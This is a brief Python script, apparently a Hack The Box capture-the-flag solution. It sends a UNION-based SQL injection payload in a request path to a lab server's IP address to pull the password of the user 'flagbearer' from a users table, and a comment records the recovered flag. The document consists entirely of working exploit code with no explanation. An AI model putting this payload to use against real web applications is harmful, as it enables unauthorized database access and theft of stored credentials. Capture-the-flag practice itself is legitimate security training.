

import requests, string
s = requests.session()
arr = "_}" + string.ascii_letters+string.digits+string.punctuation

res = s.get("http://157.245.32.65:32516/posts/0' union select 1,2,3,password from users where username='flagbearer").text
print(res)
#HTB{5qlI_th3_3vergr33n_vu1N}